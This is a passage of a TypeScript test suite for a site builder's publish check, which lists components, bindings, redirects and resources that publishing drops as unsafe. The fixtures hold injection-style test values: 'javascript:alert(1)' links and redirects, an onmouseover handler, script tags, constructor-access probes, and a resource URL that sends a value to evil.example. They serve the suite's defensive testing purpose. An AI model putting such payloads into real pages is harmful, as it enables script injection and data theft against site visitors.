        label: "Action (onValueChange) on Home",
        navigate: onHome("rotation"),
      },
      // the parameter, which no page declares
      { label: "Variable (name) on Home", navigate: onHome("rotation") },
      { label: "Action (onClick) on Home", navigate: onHome("block") },
      {
        label: "Action (onStateChange) on Home",
        navigate: onHome("generic"),
      },
      { label: "Action (onClick) on Home", navigate: onHome("regex") },
      {
        label: "Action (onStateChange) on Home",
        navigate: onHome("form-regex"),
      },
      {
        label: "Action (onStateChange) on Home",
        navigate: onHome("form-member"),
      },
      { label: "Action (onClick) on Home", navigate: onHome("shadow") },
      { label: "Action (onClick) on Home", navigate: onHome("resource") },
      { label: "Action (onClick) on Home", navigate: onHome("newline") },
      { label: "Action (onClick) on Home", navigate: onHome("newline-cr") },
      { label: "Action (onClick) on Home", navigate: onHome("newline-ls") },
      {
        label: "Action (onClick) on Home",
        navigate: onHome("newline-comment"),
      },
      {
        label: "Action (onStateChange) on Home",
        navigate: onHome("form-newline"),
      },
      {
        label: "Action (onStateChange) on Home",
        navigate: onHome("form-a"),
      },
      { label: "Action (onClick) on Home", navigate: onHome("proto") },
    ]);
  });

  // An action ships only if it passes input validation
  test("lists an action that input validation refuses, as publishing drops it", () => {
    const variable = "$ws$dataSource$v";
    const signupForm = "@organizeos/site-components:SignupForm";
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("nan", "key", "form", "kept"),
      },
      { id: "nan", component: "Box" },
      { id: "key", component: "Box" },
      { id: "form", component: signupForm },
      { id: "kept", component: "Box" },
    ]);
    const action = (
      instanceId: string,
      name: string,
      args: string[],
      code: string
    ): Prop => ({
      id: `${instanceId}-${name}`,
      instanceId,
      name,
      type: "action",
      value: [{ type: "execute", args, code }],
    });
    const props = toProps([
      action("nan", "onClick", [], `${variable} = NaN`),
      action("key", "onClick", [], `${variable} = { constructor: 1 }`),
      action("form", "onStateChange", ["state"], "state = 1"),
      action("kept", "onClick", [], `${variable} = undefined`),
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "v",
        {
          type: "variable",
          id: "v",
          name: "v",
          scopeInstanceId: "home-root",
          value: { type: "string", value: "" },
        },
      ],
    ]);

    expect(
      find({ instances, props, dataSources }).map((item) => item.label)
    ).toEqual([
      "Action (onClick) on Home",
      "Action (onClick) on Home",
      "Action (onStateChange) on Home",
    ]);
  });

  // Only a component the page imports, or one the generator writes itself,
  // ships, and the builder's global root is not an instance it stores
  test("lists an instance whose component the page does not import, and one stored with the global root's id", () => {
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("script", ":root", "box", "tabs", "signup", "list"),
      },
      { id: "script", component: "x:script", children: ids("inside") },
      { id: "inside", component: "Box" },
      { id: ":root", component: "Box" },
      { id: "box", component: "Box" },
      { id: "tabs", component: `${radix}:Tabs` },
      { id: "signup", component: "@organizeos/site-components:SignupForm" },
      { id: "list", component: "ws:collection" },
      { id: "about-root", component: "ws:root" },
    ]);
    const props = toProps([
      // a dropped instance takes its props with it
      stringProp("script", "href", "javascript:alert(1)"),
    ]);

    expect(find({ instances, props })).toEqual([
      { label: "Unknown component on Home", navigate: onHome("script") },
      {
        label: "Element with a reserved id on Home",
        navigate: onHome(":root"),
      },
      {
        label: "Unknown component on About",
        navigate: { pageId: "about", instanceSelector: ["about-root"] },
      },
    ]);
    // the components the page imports decide
    expect(
      find({ instances, props, components: new Set(["Body", "Box"]) }).map(
        (item) => item.label
      )
    ).toEqual([
      "Unknown component on Home",
      "Element with a reserved id on Home",
      "Unknown component on Home",
      "Unknown component on Home",
      "Unknown component on About",
    ]);
  });

  // A data source's id or name may not be one the page module uses for
  // anything else
  test("lists a variable whose id or name the page module uses for something else, where a page declares it", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("box") },
      { id: "box", component: "Box" },
      { id: "orphan", component: "Box" },
    ]);
    const variable = (
      id: string,
      name: string,
      scopeInstanceId: string
    ): [string, DataSource] => [
      id,
      {
        type: "variable",
        id,
        name,
        scopeInstanceId,
        value: { type: "string", value: "" },
      },
    ];
    const dataSources = new Map<string, DataSource>([
      variable("ok", "ok", "home-root"),
      variable("Box", "boxed", "box"),
      variable("set$ok", "setter", "home-root"),
      variable("taken", "taken", "home-root"),
      variable("k", "_key", "box"),
      variable("set$global", "global", ":root"),
      variable("set$orphan", "orphan", "orphan"),
    ]);
    const props = toProps([
      {
        id: "box-onClick",
        instanceId: "box",
        name: "onClick",
        type: "action",
        value: [
          {
            type: "execute",
            args: [],
            code: "$ws$dataSource$ok = $ws$dataSource$Box",
          },
        ],
      },
    ]);

    expect(
      find({
        instances,
        props,
        dataSources,
        resources: new Map([
          [
            "taken",
            {
              id: "taken",
              name: "taken",
              method: "get",
              url: '"https://example.org"',
              headers: [],
            },
          ],
        ]),
      })
    ).toEqual([
      {
        label: "Variable (setter) on Home",
        navigate: { pageId: "home", instanceSelector: ["home-root"] },
      },
      {
        label: "Variable (taken) on Home",
        navigate: { pageId: "home", instanceSelector: ["home-root"] },
      },
      { label: "Action (onClick) on Home", navigate: onHome("box") },
      { label: "Variable (boxed) on Home", navigate: onHome("box") },
      { label: "Variable (_key) on Home", navigate: onHome("box") },
      { label: "Variable (global)" },
    ]);
  });

  // What publishing drops takes what is inside it, but an instance that
  // another one that stays still holds: the dialog lists what publishing
  // counts
  test("lists nothing held inside an instance publishing drops, but what it drops itself and what another instance still holds", () => {
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("unknown", "shared"),
      },
      {
        id: "unknown",
        component: "x:script",
        children: ids("inside", "shared"),
      },
      { id: "inside", component: "Box", children: ids("embed") },
      { id: "embed", component: "HtmlEmbed" },
      { id: "shared", component: "Link" },
      // on no page, but it holds what the page drops, and it goes too
      { id: "orphan", component: "x:other", children: ids("inside") },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "Box",
        {
          type: "variable",
          id: "Box",
          name: "boxed",
          scopeInstanceId: "inside",
          value: { type: "string", value: "" },
        },
      ],
    ]);
    const props = toProps([
      {
        id: "inside-onClick",
        instanceId: "inside",
        name: "onClick",
        type: "action",
        value: [
          {
            type: "execute",
            args: [],
            code: "$ws$dataSource$Box = 1",
          },
        ],
      },
      stringProp("inside", "href", "javascript:alert(1)"),
      stringProp("shared", "href", "javascript:alert(1)"),
    ]);

    expect(
      find({ instances, props, dataSources }).map((item) => [
        item.label,
        item.navigate?.instanceSelector[0],
      ])
    ).toEqual([
      ["Unknown component on Home", "unknown"],
      ["HTML Embed on Home", "embed"],
      ["Link address (href) on Home", "shared"],
    ]);
  });

  // A parameter is declared as itself only as a page's own or as a
  // Collection's item or key, and a Collection binds nothing else
  test("lists a parameter no page declares, a variable a Collection binds and an action as a Collection's item", () => {
    const pages = createPages();
    const home = pages.pages.get("home") as Page;
    pages.pages.set("home", { ...home, systemDataSourceId: "system" });
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("link", "list", "other"),
      },
      { id: "link", component: "Link" },
      { id: "list", component: "ws:collection", children: ids("card") },
      { id: "card", component: "Box" },
      { id: "other", component: "ws:collection" },
    ]);
    const parameter = (
      id: string,
      name: string,
      scopeInstanceId: string
    ): [string, DataSource] => [
      id,
      { type: "parameter", id, name, scopeInstanceId },
    ];
    const dataSources = new Map<string, DataSource>([
      parameter("system", "system", "home-root"),
      parameter("capture", "__oosCapture", "home-root"),
      parameter("item", "item", "list"),
      [
        "v",
        {
          type: "variable",
          id: "v",
          name: "bound",
          scopeInstanceId: "home-root",
          value: { type: "string", value: "" },
        },
      ],
    ]);
    const parameterProp = (
      instanceId: string,
      name: string,
      value: string
    ): Prop => ({
      id: `${instanceId}-${name}`,
      instanceId,
      name,
      type: "parameter",
      value,
    });
    const props = toProps([
      parameterProp("link", "ref", "capture"),
      parameterProp("list", "item", "item"),
      parameterProp("card", "title", "item"),
      parameterProp("card", "aria-label", "system"),
      parameterProp("list", "itemKey", "v"),
      {
        id: "other-item",
        instanceId: "other",
        name: "item",
        type: "action",
        value: [],
      },
    ]);

    expect(find({ pages, instances, props, dataSources })).toEqual([
      {
        label: "Variable (__oosCapture) on Home",
        navigate: { pageId: "home", instanceSelector: ["home-root"] },
      },
      {
        label: "Variable (bound) on Home",
        navigate: { pageId: "home", instanceSelector: ["home-root"] },
      },
      { label: "Action (item) on Home", navigate: onHome("other") },
    ]);
  });

  // A Resource Form's own form data and browser info stay while org script
  // is paused
  test("lists no Resource Form's own form data or browser info, and a parameter of either name elsewhere", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("form", "box") },
      { id: "form", component: "ResourceForm" },
      { id: "box", component: "Box" },
    ]);
    const parameter = (
      id: string,
      name: string,
      scopeInstanceId: string
    ): [string, DataSource] => [
      id,
      { type: "parameter", id, name, scopeInstanceId },
    ];
    const parameterProp = (
      instanceId: string,
      name: string,
      value: string
    ): Prop => ({
      id: `${instanceId}-${name}`,
      instanceId,
      name,
      type: "parameter",
      value,
    });

    expect(
      find({
        instances,
        dataSources: new Map([
          parameter("form-data", "formData", "form"),
          parameter("browser-info", "browserInfo", "form"),
          parameter("box-data", "browserInfo", "box"),
        ]),
        props: toProps([
          parameterProp("form", "formData", "form-data"),
          parameterProp("form", "browserInfo", "browser-info"),
          parameterProp("box", "title", "box-data"),
        ]),
      })
    ).toEqual([
      { label: "Variable (browserInfo) on Home", navigate: onHome("box") },
    ]);
  });

  // An XML page does not publish a Resource Form, so its own form data goes
  // there, and is listed where the form is
  test("lists the form data of a Resource Form only an XML page holds", () => {
    const pages = createPages({ xmlAbout: true });
    const instances = createInstances([
      { id: "home-root", component: "Body" },
      { id: "about-root", component: "Body", children: ids("item") },
      { id: "item", component: "XmlNode", children: ids("form", "title") },
      { id: "form", component: "ResourceForm" },
      { id: "title", component: "XmlNode" },
    ]);
    expect(
      find({
        pages,
        instances,
        dataSources: new Map([
          [
            "form-data",
            {
              type: "parameter",
              id: "form-data",
              name: "formData",
              scopeInstanceId: "form",
            },
          ],
        ]),
        props: toProps([
          {
            id: "form-formData",
            instanceId: "form",
            name: "formData",
            type: "parameter",
            value: "form-data",
          },
          {
            id: "title-lang",
            instanceId: "title",
            name: "lang",
            type: "parameter",
            value: "form-data",
          },
        ]),
      })
    ).toEqual([
      {
        label: "Variable (formData) on About",
        navigate: {
          pageId: "about",
          instanceSelector: ["form", "item", "about-root"],
        },
      },
    ]);
  });

  // A Content Block's own document goes while org script is paused, and is
  // listed only when something else names it
  test("lists nothing for the Content Block the core template inserts, and its document where another prop names it", () => {
    const [core] = canvasComponentLibraries;
    const fragment = renderTemplate(
      (core.templates as Record<string, TemplateMeta>)[blockComponent].template,
      undefined,
      [],
      { componentIds: core.componentIds, componentMetas }
    );
    const block = fragment.instances.find(
      (instance) => instance.component === blockComponent
    );
    const document = fragment.dataSources.find(
      (dataSource) => dataSource.scopeInstanceId === block?.id
    );
    expect(document?.type).toBe("parameter");
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: [...fragment.children, ...ids("box")],
      },
      ...fragment.instances,
      { id: "box", component: "Box" },
    ]);
    const dataSources = new Map(
      fragment.dataSources.map((dataSource) => [dataSource.id, dataSource])
    );
    const props = fragment.props;

    expect(find({ instances, dataSources, props: toProps(props) })).toEqual([]);
    expect(
      find({
        instances,
        dataSources,
        props: toProps([
          ...props,
          {
            id: "box-title",
            instanceId: "box",
            name: "title",
            type: "parameter",
            value: document?.id ?? "",
          },
        ]),
      })
    ).toEqual([
      {
        label: `Variable (${document?.name}) on Home`,
        navigate: {
          pageId: "home",
          instanceSelector: [block?.id, "home-root"],
        },
      },
    ]);
  });

  // A Content Block's body ships, and no data source may take the name String
  test("lists a variable named String, and no Content Block body", () => {
    expect(
      find({
        instances: createInstances([
          { id: "home-root", component: "Body", children: ids("block") },
          { id: "block", component: blockComponent, children: ids("body") },
          {
            id: "body",
            component: "ws:content-block-body",
            children: ids("text"),
          },
          { id: "text", component: "Paragraph" },
        ]),
        dataSources: new Map([
          [
            "named",
            {
              type: "variable",
              id: "named",
              name: "String",
              scopeInstanceId: "home-root",
              value: { type: "string", value: "" },
            },
          ],
        ]),
      })
    ).toEqual([
      {
        label: "Variable (String) on Home",
        navigate: { pageId: "home", instanceSelector: ["home-root"] },
      },
    ]);
  });

  // Publishing reads a data source with no scope as held by an instance
  // with an empty id, where a page holds one
  test("lists a variable with no scope where publishing reads it", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("") },
      { id: "", component: "Box" },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "set$x",
        {
          type: "variable",
          id: "set$x",
          name: "unscoped",
          value: { type: "string", value: "" },
        },
      ],
    ]);

    expect(find({ instances, dataSources }).map((item) => item.label)).toEqual([
      "Variable (unscoped) on Home",
    ]);
  });

  // A page's own parameter is declared on that page alone, and a Collection
  // binds one item and one key, each through a parameter
  test("lists a page template's own parameter held on the global root's id, both parameters of a Collection with two item props, and a Collection item that is not a parameter", () => {
    const pages = createPages();
    pages.pageTemplates = new Map([
      [
        "template",
        {
          id: "template",
          name: "Template",
          title: `"Template"`,
          rootInstanceId: ":root",
          systemDataSourceId: "own",
          meta: {},
        },
      ],
    ]);
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("link", "list", "other"),
      },
      { id: "link", component: "Link" },
      { id: "list", component: "ws:collection", children: ids("card") },
      { id: "card", component: "Link" },
      { id: "other", component: "ws:collection" },
    ]);
    const parameter = (
      id: string,
      scopeInstanceId: string
    ): [string, DataSource] => [
      id,
      { type: "parameter", id, name: id, scopeInstanceId },
    ];
    const parameterProp = (
      id: string,
      instanceId: string,
      name: string,
      value: string
    ): Prop => ({ id, instanceId, name, type: "parameter", value });
    const props = toProps([
      parameterProp("link-ref", "link", "ref", "own"),
      parameterProp("list-item", "list", "item", "first"),
      parameterProp("list-item-2", "list", "item", "last"),
      parameterProp("card-ref", "card", "ref", "first"),
      {
        id: "other-item",
        instanceId: "other",
        name: "item",
        type: "expression",
        value: '"x"',
      },
    ]);
    const dataSources = new Map<string, DataSource>([
      parameter("own", ":root"),
      parameter("first", "list"),
      parameter("last", "list"),
    ]);

    expect(
      find({ pages, instances, props, dataSources }).map((item) => [
        item.label,
        item.navigate?.instanceSelector[0],
      ])
    ).toEqual([
      ["Variable (first) on Home", "list"],
      ["Variable (last) on Home", "list"],
      ["Collection item or key (item) on Home", "other"],
      ["Variable (own)", undefined],
    ]);
  });

  // Publishing keeps an HTML Embed only when every code it holds is a
  // template icon
  test("lists an HTML Embed with a template icon and another code", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("embed") },
      { id: "embed", component: "HtmlEmbed" },
    ]);
    const props = toProps([
      stringProp("embed", "code", MenuIcon),
      { ...stringProp("embed", "code", "<b>1</b>"), id: "embed-code-2" },
    ]);

    expect(find({ instances, props }).map((item) => item.label)).toEqual([
      "HTML Embed on Home",
    ]);
  });

  test("lists an XML element on an HTML page, and nothing on an XML page", () => {
    const pages = createPages({ xmlAbout: true });
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("node") },
      { id: "node", component: "XmlNode", children: ids("time") },
      { id: "time", component: "XmlTime" },
      { id: "about-root", component: "Body", children: ids("url") },
      { id: "url", component: "XmlNode" },
    ]);
    const props = toProps([
      stringProp("node", "onmouseover", "alert(1)"),
      stringProp("url", "onmouseover", "alert(1)"),
      stringProp("url", "href", "javascript:alert(1)"),
    ]);

    // its props go with it, so they are not listed
    expect(find({ pages, instances, props })).toEqual([
      { label: "XML element on Home", navigate: onHome("node") },
      {
        label: "XML element on Home",
        navigate: {
          pageId: "home",
          instanceSelector: ["time", "node", "home-root"],
        },
      },
    ]);
  });

  test("lists a page redirect that opens the page's settings, and a project redirect that opens Redirects", () => {
    const pages = createPages({ code: "<script>1</script>" });
    (pages.pages.get("home") as Page).meta = {
      redirect: '"javascript:alert(1)"',
      status: "302",
    };
    (pages.pages.get("about") as Page).meta = { redirect: '"/landing"' };
    pages.redirects = [
      { old: "/go", new: "javascript:alert(1)" },
      { old: "/old", new: "/new" },
    ];

    expect(find({ pages })).toEqual([
      {
        label: "Redirect on Home",
        navigate: { pageId: "home", instanceSelector: ["home-root"] },
        view: "pageSettings",
      },
      {
        label: "Redirect from /go (Settings)",
        view: "projectRedirects",
      },
      // still last
      { label: "Custom code" },
    ]);
  });

  // While org script is paused publishing leaves out an expression that may
  // not run where the page's modules write it, and a Resource holding one
  // (findPausedExpressions, as dropOrgScript reads it)
  test("lists a binding, a text binding, a page setting, a Resource and a redirect that may not run", () => {
    const reach = '"".constructor';
    const pages = createPages();
    const home = pages.pages.get("home") as Page;
    home.title = reach;
    home.meta = {
      description: '"Kept"',
      redirect: `"/" + ${reach}`,
      status: "302",
      custom: [
        { property: "og:x", content: reach },
        { property: "og:type", content: '"website"' },
      ],
    };
    (pages.pages.get("about") as Page).meta = { language: reach };
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("box", "text", "link"),
      },
      { id: "box", component: "Box" },
      {
        id: "text",
        component: "Text",
        children: [
          { type: "expression", value: '"t") && (1' },
          { type: "expression", value: '"kept"' },
        ],
      },
      { id: "link", component: "Link" },
    ]);
    const bound = (instanceId: string, name: string, value: string): Prop => ({
      id: `${instanceId}-${name}`,
      instanceId,
      name,
      type: "expression",
      value,
    });
    const props = toProps([
      bound("box", "title", '"x"} data-x={1'),
      bound("box", "data-ws-show", '"kept" !== ""'),
      // one that is an unsafe address too is listed once, as an address
      bound("link", "href", '"javascript:" + 0) || (1'),
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "leak-ds",
        {
          type: "resource",
          id: "leak-ds",
          name: "leak",
          scopeInstanceId: "box",
          resourceId: "leak",
        },
      ],
      [
        "kept-ds",
        {
          type: "resource",
          id: "kept-ds",
          name: "kept",
          scopeInstanceId: "box",
          resourceId: "kept",
        },
      ],
    ]);
    const resource = (id: string, url: string): Resource => ({
      id,
      name: id,
      method: "get",
      url,
      headers: [],
    });
    const resources = new Map<string, Resource>([
      ["leak", resource("leak", `"https://evil.example/?k=" + (0 < 1 > 2)`)],
      ["kept", resource("kept", '"https://example.org/"')],
    ]);
    const settings = { pageId: "home", instanceSelector: ["home-root"] };

    expect(find({ pages, instances, props, dataSources, resources })).toEqual([
      { label: "Binding (title) on Home", navigate: onHome("box") },
      { label: "Text binding on Home", navigate: onHome("text") },
      { label: "Link address (href) on Home", navigate: onHome("link") },
      {
        label: "Page setting (Title) on Home",
        navigate: settings,
        view: "pageSettings",
      },
      {
        label: "Page setting (og:x) on Home",
        navigate: settings,
        view: "pageSettings",
      },
      { label: "Redirect on Home", navigate: settings, view: "pageSettings" },
      {
        label: "Page setting (Language) on About",
        navigate: { pageId: "about", instanceSelector: ["about-root"] },
        view: "pageSettings",
      },
      { label: "Resource (leak) on Home", navigate: onHome("box") },
    ]);
  });

  // Input validation (code-check.ts) is the outer layer: publishing leaves
  // out what it refuses, and lists what a page publishes
  test("lists what input validation refuses where a page publishes it, and nothing a page does not publish", () => {
    const pages = createPages();
    const home = pages.pages.get("home") as Page;
    home.meta = { title: "a()" };
    pages.pageTemplates = new Map([
      [
        "template",
        {
          id: "template",
          name: "Template",
          title: "a()",
          rootInstanceId: "orphan",
          meta: {},
        },
      ],
    ]);
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("box") },
      { id: "box", component: "Box" },
      {
        id: "orphan",
        component: "Box",
        children: [{ type: "expression", value: "a()" }],
      },
    ]);
    const props = toProps([
      {
        id: "box-title",
        instanceId: "box",
        name: "title",
        type: "expression",
        value: "({constructor: 1})",
      },
      {
        id: "orphan-title",
        instanceId: "orphan",
        name: "title",
        type: "expression",
        value: "a()",
      },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "news-ds",
        {
          type: "resource",
          id: "news-ds",
          name: "news",
          scopeInstanceId: "box",
          resourceId: "news",
        },
      ],
    ]);
    const resource = (id: string, init: Partial<Resource>): Resource => ({
      id,
      name: id,
      method: "get",
      url: '"https://example.org/"',
      headers: [],
      ...init,
    });
    const resources = new Map<string, Resource>([
      [
        "news",
        resource("news", { headers: [{ name: "X Custom", value: '"1"' }] }),
      ],
      ["unused", resource("unused", { url: "a()" })],
    ]);

    expect(find({ pages, instances, props, dataSources, resources })).toEqual([
      { label: "Binding (title) on Home", navigate: onHome("box") },
      { label: "Resource (news) on Home", navigate: onHome("box") },
    ]);
  });

  test("lists an expression, a page setting and a Resource that name a data source publishing leaves out", () => {
    const pages = createPages();
    const home = pages.pages.get("home") as Page;
    home.meta = {
      description: `${encodeDataSourceVariable("broken-ds")}.data`,
    };
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("box", "embed") },
      { id: "box", component: "Box" },
      { id: "embed", component: "HtmlEmbed" },
    ]);
    const bound = (instanceId: string, name: string, value: string): Prop => ({
      id: `${instanceId}-${name}`,
      instanceId,
      name,
      type: "expression",
      value,
    });
    const props = toProps([
      stringProp("embed", "code", "<b>x</b>"),
      bound("box", "title", `${encodeDataSourceVariable("Box")}.length`),
      bound("box", "data-embed", encodeDataSourceVariable("embed-state")),
    ]);
    const variable = (id: string, name: string, scopeInstanceId: string) =>
      [
        id,
        {
          type: "variable",
          id,
          name,
          scopeInstanceId,
          value: { type: "string", value: "" },
        },
      ] as [string, DataSource];
    const resourceSource = (id: string) =>
      [
        `${id}-ds`,
        {
          type: "resource",
          id: `${id}-ds`,
          name: id,
          scopeInstanceId: "box",
          resourceId: id,
        },
      ] as [string, DataSource];
    const dataSources = new Map<string, DataSource>([
      variable("Box", "tag", "home-root"),
      variable("embed-state", "embedState", "embed"),
      resourceSource("broken"),
      resourceSource("named"),
    ]);
    const resources = new Map<string, Resource>([
      [
        "broken",
        {
          id: "broken",
          name: "broken",
          method: "get",
          url: "a()",
          headers: [],
        },
      ],
      [
        "named",
        {
          id: "named",
          name: "named",
          method: "get",
          url: '"https://example.org/"',
          headers: [
            {
              name: "x-embed",
              value: encodeDataSourceVariable("embed-state"),
            },
          ],
        },
      ],
    ]);
    const settings = { pageId: "home", instanceSelector: ["home-root"] };

    expect(find({ pages, instances, props, dataSources, resources })).toEqual([
      { label: "Variable (tag) on Home", navigate: settings },
      { label: "Binding (title) on Home", navigate: onHome("box") },
      { label: "Binding (data-embed) on Home", navigate: onHome("box") },
      { label: "HTML Embed on Home", navigate: onHome("embed") },
      {
        label: "Page setting (Description) on Home",
        navigate: settings,
        view: "pageSettings",
      },
      { label: "Resource (broken) on Home", navigate: onHome("box") },
      { label: "Resource (named) on Home", navigate: onHome("box") },
    ]);
  });

  // A variable holds plain data only: nothing writes an element into one
  test("lists a parameter or an expression named ref, and not one of another type", () => {
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("named", "bound", "plain"),
      },
      { id: "named", component: "Box" },
      { id: "bound", component: "Link" },
      { id: "plain", component: "Box" },
      { id: "orphan", component: "Box" },
    ]);
    const props = toProps([
      {
        id: "named-ref",
        instanceId: "named",
        name: "ref",
        type: "parameter",
        value: "held",
      },
      {
        id: "bound-ref",
        instanceId: "bound",
        name: "ref",
        type: "expression",
        value: encodeDataSourceVariable("held"),
      },
      stringProp("plain", "ref", "kept"),
      {
        id: "orphan-ref",
        instanceId: "orphan",
        name: "ref",
        type: "parameter",
        value: "held",
      },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "held",
        {
          type: "variable",
          id: "held",
          name: "held",
          scopeInstanceId: "home-root",
          value: { type: "json", value: {} },
        },
      ],
    ]);

    expect(find({ instances, props, dataSources })).toEqual([
      { label: "Element reference (ref) on Home", navigate: onHome("named") },
      { label: "Element reference (ref) on Home", navigate: onHome("bound") },
    ]);
  });

  test("lists nothing for an expression that names what the module declares, or a data source the page does not hold", () => {
    const item = encodeDataSourceVariable("item");
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("list", "outside") },
      { id: "list", component: "ws:collection", children: ids("card") },
      {
        id: "card",
        component: "Text",
        children: [{ type: "expression", value: `${item}.title` }],
      },
      { id: "outside", component: "Box" },
    ]);
    const props = toProps([
      {
        id: "list-data",
        instanceId: "list",
        name: "data",
        type: "expression",
        value: "[]",
      },
      {
        id: "list-item",
        instanceId: "list",
        name: "item",
        type: "parameter",
        value: "item",
      },
      {
        id: "outside-title",
        instanceId: "outside",
        name: "title",
        type: "expression",
        value: `${encodeDataSourceVariable("elsewhere")}.title`,
      },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "item",
        {
          type: "parameter",
          id: "item",
          name: "item",
          scopeInstanceId: "list",
        },
      ],
    ]);

    expect(find({ instances, props, dataSources })).toEqual([]);
  });

  test("lists a data source that publishing leaves out for its name, and an action judged against the data sources that ship", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("box", "button") },
      { id: "box", component: "Box" },
      { id: "button", component: "Button" },
    ]);
    const props = toProps([
      {
        id: "button-onClick",
        instanceId: "button",
        name: "onClick",
        type: "action",
        value: [
          {
            type: "execute",
            args: [],
            code: `${encodeDataSourceVariable("state")} = ${encodeDataSourceVariable("leak-ds")}`,
          },
        ],
      },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "builtin",
        {
          type: "variable",
          id: "builtin",
          name: "Object",
          scopeInstanceId: ROOT_INSTANCE_ID,
          value: { type: "string", value: "" },
        },
      ],
      [
        "scoped",
        {
          type: "variable",
          id: "scoped",
          name: "Map",
          scopeInstanceId: "box",
          value: { type: "string", value: "" },
        },
      ],
      [
        "state",
        {
          type: "variable",
          id: "state",
          name: "state",
          scopeInstanceId: "home-root",
          value: { type: "string", value: "" },
        },
      ],
      [
        "leak-ds",
        {
          type: "resource",
          id: "leak-ds",
          name: "leak",
          scopeInstanceId: "home-root",
          resourceId: "leak",
        },
      ],
    ]);
    const resources = new Map<string, Resource>([
      [
        "leak",
        {
          id: "leak",
          name: "leak",
          method: "get",
          url: '"https://example.org/" + /x/.source',
          headers: [],
        },
      ],
    ]);

    expect(find({ instances, props, dataSources, resources })).toEqual([
      { label: "Variable (Map) on Home", navigate: onHome("box") },
      { label: "Action (onClick) on Home", navigate: onHome("button") },
      { label: "Variable (Object)" },
      {
        label: "Resource (leak) on Home",
        navigate: { pageId: "home", instanceSelector: ["home-root"] },
      },
    ]);
  });

  // A data source whose id is another of the page module's names is listed
  // (collidingDataSourceIds), and an action and a binding that name it are
  // judged without it, as publishing judges them
  test("lists a data source whose id is another of the page module's names", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("box", "button") },
      { id: "box", component: "Box" },
      { id: "button", component: "Button" },
    ]);
    const props = toProps([
      {
        id: "box-title",
        instanceId: "box",
        name: "title",
        type: "expression",
        value: encodeDataSourceVariable("Box"),
      },
      {
        id: "button-onClick",
        instanceId: "button",
        name: "onClick",
        type: "action",
        value: [
          {
            type: "execute",
            args: [],
            code: `${encodeDataSourceVariable("state")} = ${encodeDataSourceVariable("Box")}`,
          },
        ],
      },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "Box",
        {
          type: "variable",
          id: "Box",
          name: "box",
          scopeInstanceId: "home-root",
          value: { type: "string", value: "" },
        },
      ],
      [
        "state",
        {
          type: "variable",
          id: "state",
          name: "state",
          scopeInstanceId: "home-root",
          value: { type: "string", value: "" },
        },
      ],
    ]);

    // and what names it
    expect(find({ instances, props, dataSources })).toEqual([
      {
        label: "Variable (box) on Home",
        navigate: { pageId: "home", instanceSelector: ["home-root"] },
      },
      { label: "Binding (title) on Home", navigate: onHome("box") },
      { label: "Action (onClick) on Home", navigate: onHome("button") },
    ]);
  });

  // An expression holds no comment, and an object literal no shorthand
  // property
  test("lists an expression that holds a comment or a shorthand property", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("box") },
      { id: "box", component: "Box" },
    ]);
    const props = toProps([
      {
        id: "box-title",
        instanceId: "box",
        name: "title",
        type: "expression",
        value: `${encodeDataSourceVariable("state")} /* x */ .length`,
      },
      {
        id: "box-data",
        instanceId: "box",
        name: "data-x",
        type: "expression",
        value: `({${encodeDataSourceVariable("state")}})`,
      },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "state",
        {
          type: "variable",
          id: "state",
          name: "state",
          scopeInstanceId: "home-root",
          value: { type: "string", value: "" },
        },
      ],
    ]);

    expect(find({ instances, props, dataSources })).toEqual([
      { label: "Binding (title) on Home", navigate: onHome("box") },
      { label: "Binding (data-x) on Home", navigate: onHome("box") },
    ]);
  });

  // What the Publish dialog lists, publishing counts: an action of an
  // instance that only an instance on no page holds once what goes has gone
  // is neither
  test("lists no action of an instance that only an instance on no page holds once what goes has gone", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("embed") },
      { id: "embed", component: "HtmlEmbed", children: ids("held") },
      { id: "orphan", component: "Box", children: ids("held") },
      { id: "held", component: "Box" },
    ]);
    const props = toProps([
      {
        id: "embed-code",
        instanceId: "embed",
        name: "code",
        type: "string",
        value: "<script>1</script>",
      },
      {
        id: "held-onClick",
        instanceId: "held",
        name: "onClick",
        type: "action",
        value: [
          {
            type: "execute",
            args: [],
            code: `${encodeDataSourceVariable("state")} = ${encodeDataSourceVariable("inner")}`,
          },
        ],
      },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "state",
        {
          type: "variable",
          id: "state",
          name: "state",
          scopeInstanceId: "home-root",
          value: { type: "string", value: "" },
        },
      ],
      [
        "inner",
        {
          type: "variable",
          id: "inner",
          name: "inner",
          scopeInstanceId: "embed",
          value: { type: "string", value: "" },
        },
      ],
    ]);

    expect(
      find({ instances, props, dataSources }).map(({ label }) => label)
    ).toEqual(["HTML Embed on Home"]);
  });

  test("lists a Resource that a data source or a resource prop names and the build does not hold", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("form") },
